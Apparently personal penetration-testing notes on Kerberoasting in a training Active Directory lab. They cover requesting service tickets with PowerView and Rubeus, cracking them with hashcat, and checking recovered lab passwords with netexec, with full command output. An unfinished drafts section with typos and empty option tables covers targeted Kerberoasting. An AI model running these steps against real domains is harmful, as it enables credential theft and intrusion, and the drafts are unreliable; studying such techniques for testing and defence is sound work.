> Hash                 : krb5tgs23*svcsqlINLANEFREIGHT.LOCALMSSQLSvc/SQL01.inlanefreight.local:1433*F2C716B971BE178EA0C92F5275A79FDF$CCDE308B78004776895CD02D0115B0BA82E232EDE7FC753759B097D29C9203F3B5E67C30C419D8D538B591D6643E1AE730F12313FCF59042AEBE5EAC3D8A5116F547E149BC0F8D80A7D58CFA3CB8EE318438165B0B9B91550ECFD31DE8B1109EA7503694916D95A09D13D63821917E11CF578FDD464B6944463FC96F61D71EB61505ADB835D040C21DC249297AEB3D7A5AE8EFC8DB9055C3CE7C62FBB8FBA3F469F5C1E8E67AE2A49A8ED57DFF58CC4F4F4B0B0C947B525078910F93720ED6E052AA38BE321E390BD272EDD1B508A888751EC078917F2856E504586BEF821C368C4B969DB348503A3B0C5B04611FB280416AEE40A5514E2DF71A624AABF99C79B330439A7723594ECB0538CAE5CB05D121E675A82AB7307328429F829171F6F61408B067A1105F853FF1C305A63F41BF250C9A06D97E1371E344F23D703202445B9FCBF216D8FD52E0C92726003904999227EB7F061BA6FE214B696703FBF40AFBA3D7427C7BEAFF10E948F3E25D071EA8DFC09CF8EA642379F353375ED33A32614C0FE5E03326E6BB69964CE162BC8984E6EC9C1EC9CE22667AEEA69BCDDCF28082F3DDD631E2E7DFAE5C8CD7E46B2EBA290E5F0396142B99BD84A8BBD0083BE46C084CE1E3FB9B836E67317ED1116DB60C7E7B77C93A110D15F1494251CFA1F80AF928AB24C15DA284BDB59787132EE0C9BE0E1DF2BFEF6CB0302BFE7DBCA4BF74F2AD720409820ACA1F298DF1313D8013131A1744B747D77CEFD31DB270C41D2A8522A3EA6215C48141C96F5D7432E35A73C213CF40F0985C625255E2C66699E3C313F60C30CBE028429B1D0EF8B7A07AC64320ED028CA171FDA163CFB97CB1C1311D473B84DC70589A9018C0206E7B6252396C10D2BC23913CCB9EF26031927623CBA8DDF0C7882943DFCEB3B0EB111420664EA8D67E5B4279E3F5B7B78F7A1195E019A713D4390BF1ABAD575AC304EAB5115A02E70EB56F68B956208D95F925F594D849FB7F30AA9536413E6E8583DE38F5323679A24C97801BBD806E5921B4360E8ACB5F2B1B33A45A1388B321ACF20BF2CCEBC89AE7220129FF2AA08D5F68BEA527843B2F35DD5E89939DA6113C60BCB40421537D421C3726CD327D1116EFAD50BE44384DA24928231EAE64D5C97DF3C69A55A81028549AB89D6F151A922A960458E9D27363DC97226BA08D1A37B271396B0819752317B67B4837C261AFF117302F2518BF359784B0BA21A80B92E1D7A2CFDDD94201BD540C12BE0A3EF6597207E65CE95DE6689D53AADDC18D59040FE0F14CC68FF2B2000C121E8C84FA234D18F5EDD1F7CCB9EEE2E6D621C96794EC0D2A97B2D0E7E94D47536DE9F85686556B0F04E0D87DA29DB5D780D5372CF68AF94357B3988DAE98CCE9196E585F5DCD023DEA466C49E15D0FBA771B774ADAFA6CAC1AEEBED915F1F957CB08221CBCF9050DE70C1DCB9244DAA4EA4FAE43871CBDF2B76CB5978A428DE9C57BFF66826D63515F21EF3E947C88B32769D077ED011F2C3B77F8
> ```

- Dump the whole domain in one go to CSV:

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -Path .\domain_spns.csv -NoTypeInformation
```

> [!note] `Invoke-Kerberoast` is the older `PowerView` function for this; `Get-DomainSPNTicket` is the modern replacement; it handles formatting natively.
### Kerberoasting from Windows (automated with `Rubeus`)

- You can also use `GhostPack`'s [`Rubeus`](https://github.com/GhostPack/Rubeus); it does everything above in one binary and gives you the most control over *what* gets requested.

- Recon without requesting tickets:

```powershell
Rubeus.exe kerberoast /stats
```

>[!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe kerberoast /stats
> ```
> 
> ```powershell
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.0.2
> 
> 
> [*] Action: Kerberoasting
> 
> [*] Listing statistics about target users, no ticket requests being performed.
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] Total kerberoastable users : 12
> 
> 
>  ------------------------------------------------------------
>  | Supported Encryption Type                        | Count |
>  ------------------------------------------------------------
>  | RC4_HMAC_DEFAULT                                 | 11    |
>  | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 1     |
>  ------------------------------------------------------------
> 
>  ----------------------------------
>  | Password Last Set Year | Count |
>  ----------------------------------
>  | 2022                   | 12    |
>  ----------------------------------
> ```

- Roast the whole domain:

```powershell
Rubeus.exe kerberoast /nowrap
```

>[!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe kerberoast /nowrap
> ```
> 
> ```powershell
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.0.2
> 
> 
> [*] Action: Kerberoasting
> 
> [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
> [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
> 
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] Total kerberoastable users : 12
> 
> 
> [*] SamAccountName         : adfs
> [*] DistinguishedName      : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : adfsconnect/azure01.inlanefreight.local
> [*] PwdLastSet             : 2/15/2022 2:15:27 PM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local@INLANEFREIGHT.LOCAL*$C1FB6BC2#...
> 
> 
> [*] SamAccountName         : backupagent
> [*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
> [*] PwdLastSet             : 2/15/2022 2:15:40 PM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$AFA34165#...
> 
> 
> [*] SamAccountName         : certsvc
> [*] DistinguishedName      : CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
> [*] PwdLastSet             : 3/30/2022 12:44:18 PM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*certsvc$INLANEFREIGHT.LOCAL$http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL*$A92C22BE#...
> 
> [*] SamAccountName         : damundsen
> [*] DistinguishedName      : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
> [*] PwdLastSet             : 3/24/2022 9:20:34 AM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*damundsen$INLANEFREIGHT.LOCAL$MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433@INLANEFREIGHT.LOCAL*$469E4FC5#... 
> 
> # ...
> ```

- Target privileged accounts only:

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

- Save to a file:

```powershell
Rubeus.exe kerberoast /outfile:hashes.txt
```

| Option                    | Description                                                                                                         |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| `/user:username`          | Request a service ticket only for the specified service account.                                                    |
| `/spn:"SPN"`              | Roast a specific Service Principal Name (SPN) instead of enumerating all SPNs.                                      |
| `/ou:"LDAP OU"`           | Restrict enumeration to a specific Organizational Unit (OU).                                                        |
| `/domain:domain.local`    | Target a specific Active Directory domain.                                                                          |
| `/dc:dc01.domain.local`   | Send requests to a specific Domain Controller.                                                                      |
| `/creduser:DOMAIN\user`   | Authenticate using an alternate account instead of the current logon session.                                       |
| `/credpassword:password`  | Password for `/creduser`.                                                                                           |
| `/credkey:<NTLM/AES key>` | Authenticate using a supplied Kerberos key instead of a password.                                                   |
| `/resultslimit:N`         | Limit the number of Kerberoast requests generated. Useful for reducing noise during testing.                        |
| `/simple`                 | Output only the extracted Kerberos hashes without additional information.                                           |
| `/nowrap`                 | Print hashes on a single line, preventing line wrapping for easier copying.                                         |
| `/outfile:file.txt`       | Save extracted Kerberos hashes directly to a file.                                                                  |
| `/stats`                  | Display Kerberoastable accounts and encryption types without requesting service tickets. Useful for reconnaissance. |
| `/ldapfilter:"(filter)"`  | Apply a custom LDAP filter when searching for service accounts.                                                     |
| `/pwdsetbefore:DATE`      | Target only accounts whose password was set before the specified date.                                              |
| `/pwdsetafter:DATE`       | Target only accounts whose password was set after the specified date.                                               |
| `/tgtdeleg`               | Use the Kerberos delegation trick to obtain RC4-encrypted tickets when possible, enabling faster offline cracking.  |
| `/rc4opsec`               | Request RC4 tickets only from accounts that already support RC4, avoiding suspicious forced downgrades.             |
| `/aes`                    | Request AES-encrypted service tickets instead of RC4 when supported.                                                |
| `/aesopsec`               | Request AES tickets only from accounts that advertise AES support.                                                  |
| `/enterprise`             | Use enterprise principal names (UPNs) instead of standard SPNs when appropriate.                                    |
| `/delay:N`                | Pause _N_ milliseconds between requests to reduce traffic bursts.                                                   |
| `/jitter:N`               | Randomize the delay between requests by the specified percentage.                                                   |
## Cracking STs offline

- All of the above ends with one or more `$krb5tgs$...` strings. The rest is password cracking.

- Crack RC4 tickets:

```bash
hashcat -m 13100 -a 0 backupjobTGS.txt /usr/share/wordlists/rockyou.txt
```

>[!example]-
> ```bash
> hashcat -m 13100 -a 0 backupjobTGS.txt /usr/share/wordlists/rockyou.txt
> ```
> 
> ```bash
> hashcat (v6.2.6) starting
> 
> OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
> ==================================================================
> * Device #1: AMD EPYC 7543 32-Core Processor, 3921/7907 MB (988 MB allocatable), 4MCU
> 
> OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
> ====================================================================================================================================================
> * Device #2: cpu-haswell-AMD EPYC 7543 32-Core Processor, skipped
> 
> Minimum password length supported by kernel: 0
> Maximum password length supported by kernel: 256
> 
> Hashes: 1 digests; 1 unique digests, 1 unique salts
> Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
> Rules: 1
> 
> Optimizers applied:
> * Zero-Byte
> * Not-Iterated
> * Single-Hash
> * Single-Salt
> 
> ATTENTION! Pure (unoptimized) backend kernels selected.
> Pure kernels can crack longer passwords, but drastically reduce performance.
> If you want to switch to optimized kernels, append -O to your commandline.
> See the above message to find out about the exact limits.
> 
> Watchdog: Hardware monitoring interface not found on your system.
> Watchdog: Temperature abort trigger disabled.
> 
> Host memory required for this attack: 1 MB
> 
> Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytDictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 byDictionary cache built:
> * Filename..: /usr/share/wordlists/rockyou.txt
> * Passwords.: 14344392
> * Bytes.....: 139921507
> * Keyspace..: 14344385
> * Runtime...: 1 sec
> 
> $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$309c9b686162b14b12e4ac4e2176fc83$ac145bb544680fa02e039cb49eb59f2d5fc4e65798a8b29484929856ddf1c78fb553a344f706a0f5205c8bbe2a30dab9bff560923ff6c4fb4f1448d7f356a857ad44d26941c4af744e15439d914c71eb02335994a9c4fabc986646abe20571176c8c9bf5738e636e69c4864df4a289af86e5e86690f7e87defd64daf780ade15469a750ca1bb528ce4b3e57ca7b358787d10da71800d4cc5d967677a8940da9b7047ad655ab19fc5d0338ddd1cf1e20053b55e7d01c26fe69c91cb12e577f997416a5ecbd260482fc7962a489481c22409c37601909bb5cb010b98ef3f64f6d79a625c35020b643fe35c9902b628a8a145c9a9dcd5e864dba02946cd79c140a36081132cb5b39ba757a2052dae5707144393ccd6109baa0b672230dd688dbfcb8e994da9d8205c85e2a2e8f6d34c4689d7635d46c7b12dc262d8c47c8d70b26a06835d3dee96fa97b37f6caaeabd052e424d64dde2f5b7a4aa5d0f00abeeeae7ce2c11c992afe587efa4e8296cf3cc568436dfafc13171851c9ba73248b4a466615d3c53dc76aed4c6fb6428c8a848ebb14a89250eb3f89118a59c23a2702a2d2707d2b2f1ea16ae9043515582c1787a42aae004b3381473bdc1910307ede1f97004eb93a9bff74447d9c10f4edf1716bbd973e0b689042d00e954a034cc03ffc282062e1e9792860f5ecc22378bd0a5f87c40889d7ca3f0f34410c568788f32659ec866380b100b9af13d09ab53615c89c25ea41d77c2047cfc2183f1296318d337537b73d1fbca6b602b3605f9266f8b8e524b2e1e241c9b0cf4810c3e4c1aa43b97bba4f3e0cab65a3c2a4db941d7e3eee33520dda810c56dfd1435d6223d3bb9bf182fd81b3d25500fa5925584da06f5a77d6051deebf8dbe8e1e0310b8e089daf210933fa5fa75353a07d15851cd8352270b56a56e6e4fbce2308f5b1f2fef3c707faa71d8cf37ef5f3d4c68e4b0c6725f8b2dc1ec60166ea4c74621ca5fff1d3792c9c53473e7eb4158b4c09ba9cc44bc79226d995e13cdbdeeb631f62ba91fb79b4818fb5cb3e17a48f5a291ea772c1bb6655616a67417e5ab03077976b6f7a6aafa330bc5e35328834fffa9173319abb8067e3d73be25eafd17a627fa8d954e3ac61bdbdc9c8e0b7cb71684697ab2405a205895ffdd58c1fcc0f8afddfc19a910c93b0cd9f12b14871e8e6650bb097cd389b6bc37fe36e2e6e5430550e61753fd19c106762827d57d7d1b6c0b57a0860229392db302e4f7e7e0147105eb333bae38692861c29ec732ebff026e7c64b6483650961543db7e4c4416df6162ee687e03fff3409aab92aa407a5257bac9da5f82cce7bf63727:lucky7
>                                                           
> Session..........: hashcat
> Status...........: Cracked
> Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
> Hash.Target......: $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFR...f63727
> Time.Started.....: Sat Oct 10 12:14:58 2026 (0 secs)
> Time.Estimated...: Sat Oct 10 12:14:58 2026 (0 secs)
> Kernel.Feature...: Pure Kernel
> Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
> Guess.Queue......: 1/1 (100.00%)
> Speed.#1.........:  1288.2 kH/s (1.30ms) @ Accel:512 Loops:1 Thr:1 Vec:8
> Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
> Progress.........: 2048/14344385 (0.01%)
> Rejected.........: 0/2048 (0.00%)
> Restore.Point....: 0/14344385 (0.00%)
> Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
> Candidate.Engine.: Device Generator
> Candidates.#1....: 123456 -> lovers1
> 
> Started: Sat Oct 10 12:14:48 2026
> Stopped: Sat Oct 10 12:14:59 2026
> ```


- Crack AES-256 tickets:

```bash
hashcat -m 19700 -a 0 aes_hashes.txt /usr/share/wordlists/rockyou.txt
```

| Encryption           | Ticket format     | Hashcat mode |
| -------------------- | ----------------- | ------------ |
| RC4 (`etype 23`)     | `$krb5tgs$23$...` | `13100`      |
| AES-128 (`etype 17`) | `$krb5tgs$17$...` | `19600`      |
| AES-256 (`etype 18`) | `$krb5tgs$18$...` | `19700`      |

>[!note] John eats the `$krb5tgs$23$` format directly (`--format=krb5tgs`); for `.kirbi` files, pipe through `kirbi2john.py` first.
### Validating a recovered password

- You can test a password against network services using `netexec`:

```bash
netexec smb 172.16.5.5 -u sqldev -p 'database!'
```

```bash
netexec winrm 172.16.5.5 -u sqldev -p 'database!'
```

- If SMB comes back `[+]`, you've got a working password.

>[!example]-
> ```bash
> crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi2'
> ```
> 
> ```bash
> [*] First time use detected
> [*] Creating home directory structure
> [*] Creating default workspace
> [*] Initializing LDAP protocol database
> [*] Initializing MSSQL protocol database
> [*] Initializing SMB protocol database
> [*] Initializing SSH protocol database
> [*] Initializing WINRM protocol database
> [*] Copying default configuration file
> [*] Generating SSL certificate
> SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
> SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\SAPService:!SapperFi2
> ```
## References and further reading

- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
- [`Service Principal Names — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)
- [`Kerberoasting without Mimikatz — HarmJ0y`](https://www.harmj0y.net/blog/redteaming/kerberoasting-without-mimikatz/)
- [`Attacking Kerberos: Kicking the Guard Dog of Hades — Tim Medin, DerbyCon 2014`](https://www.youtube.com/watch?v=xCBBuLxH5Q4)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket — Fortra GitHub`](https://github.com/fortra/impacket)
- [`Kerberoasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
- [`Kerberos & Service Tickets — SpecterOps blog`](https://posts.specterops.io/)
- [`Decrypting the Selection of Supported Kerberos Encryption Types — Microsoft Tech Community`](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797)
- [`Event 4769 — A Kerberos service ticket was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [`Group Managed Service Accounts — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)

- [`Targeted Kerberoasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)
- [`Kerberoasting — NetExec Wiki`](https://www.netexec.wiki/ldap-protocol/kerberoasting)

# drafts
## Targeted Kerberoasting

- Targeted Kerberoasting can be performed when you have `GenericAll`, `GenericWrite`, `WritePropery`, or `Validated-SPN` over the target user. These permissions give you the ability to add an SPN to the controlled account, making it vulnerable to Kerberoasting.
- A member of the `Account Operators` group usually has those permissions.

>[!note] See [[AD ACL attacks]] and [[Account Operators]].

### From Linux

- To perform targeted Kerberoasting from a Linux machine, you can use [`targetedKerberoast.py`](https://github.com/ShutdownRepo/targetedKerberoast):

```bash
targetedKeberoast.py -v -d 'dc01.example.com' -u 'jdoe' -p ''
```

>[!note]+ Option breakdown

// sort the options in the logical order, too

| Option                  | Description |
| ----------------------- | ----------- |
| `-v`, `--verbose`       |             |
| `-D`, `--target-domain` |             |
| `-o`, `--output-file`   |             |
| `--dc-ip`               |             |
| `--request-user`        |             |
| `-u`, `--user`          |             |
| `-k`, `--kerberos`      |             |
| `--no-pass`             |             |
| `-p`, `--password`      |             |
| `-H`, `--hashes`        |             |
| `--aes-key`             |             |
| `-U`, `--users-file`    |             |

- Using [[🛠️ NetExec & CrackMapExec|NetExec]]:

```bash
# nxc ldap <DC_host> -d <domain> -u <user> -p <password> --kerberoasting <output_file> --targeted-kerberoast <target_users>
```
```bash
nxc ldap dc01.example.com -d example.com -u 'jdoe' -p 'passwd123' --kerberoasting output.txt --targeted-kerberoast 'rroe'
```

- Once you've got the ticket, you may be able to crack it. See [[🛠️ Password cracking]].
### From Windows

- Check if the target user has an SPN already:

```powershell
Get-DomainUser 'rroe' | Select serviceprinciaplname
```

- Set the SPN:

```powershell
# Set-DomainObject -Identity '<target_user>' -Set @{serviceprincipalname='<service>/<hostname>'}
```
```powershell
Set-DomainObject -Identity 'rroe' -Set @{serviceprincipalname='nonexistent/SERVICE.EXAMPLE.COM'}
```

```powershell
setspn -S HTTP/app01.example.com EXAMPLE.COM\rwade
```

- Verify

```powershell
setspn -Q <SPN>
```
---

```powershell
$User = Get-DomainUser $TARGET_USER
$User | Get-DomainSPNTicket | fl

$User | Select serviceprincipalname
Set-DomainObject -Identity $TARGET_USER -Clear serviceprincipalname
```